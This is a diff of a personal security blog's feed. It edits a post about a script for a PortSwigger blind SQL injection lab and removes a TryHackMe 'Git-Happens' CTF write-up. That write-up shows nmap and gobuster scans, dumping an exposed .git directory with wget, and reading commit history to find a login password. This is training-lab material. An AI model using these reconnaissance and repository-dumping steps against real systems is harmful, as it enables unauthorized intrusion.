@@ -220,7 +1073,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 &lt;p&gt;This post is to provide the script I created to automate the process of using blind SQL injection with conditional responses to brute force a password. This was completed for a lab while completing the SQL Injection topic on &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;WebSecurity Academy&lt;/a&gt;. I can’t recommend this training enough, the content is well written and the labs are great and best of all its free!&lt;/p&gt;
 
-&lt;p&gt;As part of the lab I completed process in 3 ways, manually using Burp repeater, using Burp intruder and finally by writing this Python script. I still learning Python and this was a good exercise to do more Python coding and also reenforce the learning.&lt;/p&gt;
+&lt;p&gt;As part of the lab I completed the process 3 ways, manually using Burp repeater, using Burp intruder and finally by writing this Python script. I am still learning Python and this was a good exercise to do more Python coding and also reenforce the learning.&lt;/p&gt;
 
 &lt;h3 id=&quot;final-script&quot;&gt;Final Script&lt;/h3&gt;
 
@@ -3073,304 +3926,5 @@ root@overpass-prod:/home/tryhackme#
 &lt;p&gt;As mentioned this code has been claimed but I wanted to show the steps on acquiring it.&lt;/p&gt;
 
 &lt;p&gt;[{“name”:”TryHackMe Subscription Code”,”pass”:”gmTDyl”}]&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><summary type="html"></summary></entry><entry><title type="html">Git-Happens Write Up</title><link href="https://darrynbrownfield.co.uk/githappens" rel="alternate" type="text/html" title="Git-Happens Write Up" /><published>2020-09-12T00:00:00+00:00</published><updated>2020-09-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/githappens</id><content type="html" xml:base="https://darrynbrownfield.co.uk/githappens">&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/cover.png&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;Git-Happens is an easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with the description:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Boss wanted me to create a prototype, so here it is! We even used something called “version control” that made deploying this really easy!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;We only have 1 task, find the super secret password.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.39.144’. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.39.144
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 13:07 BST
-Nmap scan report for 10.10.39.144
-Host is up (0.025s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE VERSION
-80/tcp open  http    nginx 1.14.0 (Ubuntu)
-| http-git: 
-|   10.10.39.144:80/.git/
-|     Git repository found!
-|_    Repository description: Unnamed repository; edit this file 'description' to name the...
-|_http-server-header: nginx/1.14.0 (Ubuntu)
-|_http-title: Super Awesome Site!
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The only port is HTTP, I browsed to the machine and found what appears to be a login page but nothing happened when I tried to log in.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/WebPage.png&quot; alt=&quot;WebPage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I continued with some basic web enumeration by running Gobuster but didnt find anything.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $gobuster dir -u http://10.10.39.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.39.144
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/09/12 13:15:14 Starting gobuster
-===============================================================
-/css (Status: 301)
-===============================================================
-2020/09/12 13:17:12 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However nmap did find /.git/ so I looked at that next.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/GitPage.png&quot; alt=&quot;GitPage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I tried to run git clone to download the files from the server but had no joy.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $git clone http://10.10.39.144/
-Cloning into '10.10.39.144'...
-fatal: repository 'http://10.10.39.144/' not found
-┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $git clone http://10.10.39.144/.git
-Cloning into '10.10.39.144'...
-fatal: repository 'http://10.10.39.144/.git/' not found
-┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $git clone http://10.10.39.144/.git/
-Cloning into '10.10.39.144'...
-fatal: repository 'http://10.10.39.144/.git/' not found
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I did find some tools to dump the git files. However, I used wget using the -r flag to download the files.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]                                                                                                                             
-└──╼ $wget -r http://10.10.39.144/.git/                                                                                                                                       
---2020-09-12 13:23:22--  http://10.10.39.144/.git/                                                                                                                            
-Connecting to 10.10.39.144:80... connected.                                                                                                                                   
-HTTP request sent, awaiting response... 200 OK                                                                                                                                
-Length: unspecified [text/html]                                                                                                                                               
-Saving to: ‘10.10.39.144/.git/index.html’                                                                                                                                     
-                                                                                                                                                                              
-10.10.39.144/.git/index.html                     [ &amp;lt;=&amp;gt;                                                                                           ]   1.36K  --.-KB/s    in 0s 
-
-2020-09-12 13:23:22 (146 MB/s) - ‘10.10.39.144/.git/index.html’ saved [1391]
-
-Loading robots.txt; please ignore errors.
---2020-09-12 13:23:22--  http://10.10.39.144/robots.txt
-Reusing existing connection to 10.10.39.144:80.
-HTTP request sent, awaiting response... 404 Not Found
-2020-09-12 13:23:22 ERROR 404: Not Found.
-
---2020-09-12 13:23:22--  http://10.10.39.144/ 
-Reusing existing connection to 10.10.39.144:80.
-HTTP request sent, awaiting response... 200 OK
-Length: 6890 (6.7K) [text/html]
-Saving to: ‘10.10.39.144/index.html’
-
-10.10.39.144/index.html                      100%[==============================================================================================&amp;gt;]   6.73K  --.-KB/s    in 0s 
-
-2020-09-12 13:23:22 (16.1 MB/s) - ‘10.10.39.144/index.html’ saved [6890/6890]
-
---2020-09-12 13:23:22--  http://10.10.39.144/.git/branches/
-Reusing existing connection to 10.10.39.144:80.
-HTTP request sent, awaiting response... 200 OK
-Length: unspecified [text/html]
-Saving to: ‘10.10.39.144/.git/branches/index.html’
-
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now I had all the files, I took a look through but nothing jumped out as a super secret password so did some research on the git commands to see how I could use the files.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $ls
-10.10.39.144  nmap
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $cd 10.10.39.144/
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $ls -lah
-total 8.0K
-drwxr-xr-x 1 daz daz   34 Sep 12 13:23 .
-drwxr-xr-x 1 daz daz   32 Sep 12 13:23 ..
-drwxr-xr-x 1 daz daz   18 Sep 12 13:23 css
-drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .git
--rw-r--r-- 1 daz daz 6.8K Jul 23 23:39 index.html
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $ls -lah .git
-total 24K
-drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .
-drwxr-xr-x 1 daz daz   34 Sep 12 13:23 ..
-drwxr-xr-x 1 daz daz   20 Sep 12 13:23 branches
--rw-r--r-- 1 daz daz  110 Jul 24 07:25 config
--rw-r--r-- 1 daz daz   73 Jul 23 23:39 description
--rw-r--r-- 1 daz daz   23 Jul 23 23:39 HEAD
-drwxr-xr-x 1 daz daz  434 Sep 12 13:23 hooks
--rw-r--r-- 1 daz daz  645 Jul 23 23:39 index
--rw-r--r-- 1 daz daz 1.4K Sep 12 13:23 index.html
-drwxr-xr-x 1 daz daz   34 Sep 12 13:23 info
-drwxr-xr-x 1 daz daz   36 Sep 12 13:23 logs
-drwxr-xr-x 1 daz daz  164 Sep 12 13:23 objects
--rw-r--r-- 1 daz daz  102 Jul 24 07:25 packed-refs
-drwxr-xr-x 1 daz daz   52 Sep 12 13:23 refs
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Running git without any flags shows the help output and some of available commands.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]                     
-└──╼ $git                                                                          
-usage: git [--version] [--help] [-C &amp;lt;path&amp;gt;] [-c &amp;lt;name&amp;gt;=&amp;lt;value&amp;gt;]                    
-           [--exec-path[=&amp;lt;path&amp;gt;]] [--html-path] [--man-path] [--info-path]         
-           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]     
-           [--git-dir=&amp;lt;path&amp;gt;] [--work-tree=&amp;lt;path&amp;gt;] [--namespace=&amp;lt;name&amp;gt;]            
-           &amp;lt;command&amp;gt; [&amp;lt;args&amp;gt;]                                                      
-                                                                                   
-These are common Git commands used in various situations:                          
-                                                                                   
-start a working area (see also: git help tutorial)
-   clone             Clone a repository into a new directory
-   init              Create an empty Git repository or reinitialize an existing one
-
-work on the current change (see also: git help everyday)
-   add               Add file contents to the index
-   mv                Move or rename a file, a directory, or a symlink
-   restore           Restore working tree files
-   rm                Remove files from the working tree and from the index
-   sparse-checkout   Initialize and modify the sparse-checkout
-
-examine the history and state (see also: git help revisions)
-   bisect            Use binary search to find the commit that introduced a bug
-   diff              Show changes between commits, commit and working tree, etc
-   grep              Print lines matching a pattern
-   log               Show commit logs
-   show              Show various types of objects
-   status            Show the working tree status
-
-grow, mark and tweak your common history
-   branch            List, create, or delete branches
-   commit            Record changes to the repository
-   merge             Join two or more development histories together
-   rebase            Reapply commits on top of another base tip
-   reset             Reset current HEAD to the specified state
-   switch            Switch branches
-   tag               Create, list, delete or verify a tag object signed with GPG
-
-collaborate (see also: git help workflows)
-   fetch             Download objects and refs from another repository
-   pull              Fetch from and integrate with another repository or a local branch
-   push              Update remote refs along with associated objects
-
-'git help -a' and 'git help -g' list available subcommands and some
-concept guides. See 'git help &amp;lt;command&amp;gt;' or 'git help &amp;lt;concept&amp;gt;'
-to read about a specific subcommand or concept.
-See 'git help git' for an overview of the system.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;First I ran the ‘log’ command to check the commits.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]             
-└──╼ $git log                                                              
-commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -&amp;gt; master, tag: v1.0)
-Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;                               
-Date:   Thu Jul 23 22:22:16 2020 +0000                                     
-                                                                           
-    Update .gitlab-ci.yml                                                  
-                                                                           
-commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d                            
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
-Date:   Fri Jul 24 00:21:25 2020 +0200                                     
-                                                                           
-    add gitlab-ci config to build docker file.                             
-                                                                           
-commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199                            
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
-Date:   Fri Jul 24 00:08:38 2020 +0200                                     
-                                                                           
-    setup dockerfile and setup defaults.                                   
-                                                                           
-commit d6df4000639981d032f628af2b4d03b8eff31213                            
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
-Date:   Thu Jul 23 23:42:30 2020 +0200
-
-    Make sure the css is standard-ish!
-
-commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:41:12 2020 +0200
-
-    re-obfuscating the code to be really secure!
-
-commit bc8054d9d95854d278359a432b6d97c27e24061d
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:37:32 2020 +0200
-
-    Security says obfuscation isn't enough.
-    
-    They want me to use something called 'SHA-512'
-
-commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:25:52 2020 +0200
-
-    Obfuscated the source code.
-    
-    Hopefully security will be happy!
-
-commit 395e087334d613d5e423cdf8f7be27196a360459
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:17:43 2020 +0200
-
-    Made the login page, boss!
-
-commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
-Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Mon Jul 20 20:46:28 2020 +0000
-
-    Initial commit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great, we can now see all the commits. Commits 2 and 3 look interesting, clearly the security team were not happy with the configuration, so lets take a look at the source code. I will use git diff to compare. We could also use git checkout.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $git diff 395e087334d613d5e423cdf8f7be27196a360459
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-     &amp;lt;script&amp;gt;
--      function login() {
--        let form = document.getElementById(&quot;login-form&quot;);
--        console.log(form.elements);
--        let username = form.elements[&quot;username&quot;].value;
--        let password = form.elements[&quot;password&quot;].value;
--        if (
--          username === &quot;admin&quot; &amp;amp;&amp;amp;
--          password === &quot;&quot;
--        ) {
--          document.cookie = &quot;login=1&quot;;
--          window.location.href = &quot;/dashboard.html&quot;;
--        } else {
--          document.getElementById(&quot;error&quot;).innerHTML =
--            &quot;INVALID USERNAME OR PASSWORD!&quot;; 
--        }
--      }
-
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Found it! Ive redacted it from the output as part of the TryHackMe write up rules however the password is part of the login function.&lt;/p&gt;
 
 &lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><summary type="html"></summary></entry></feed>
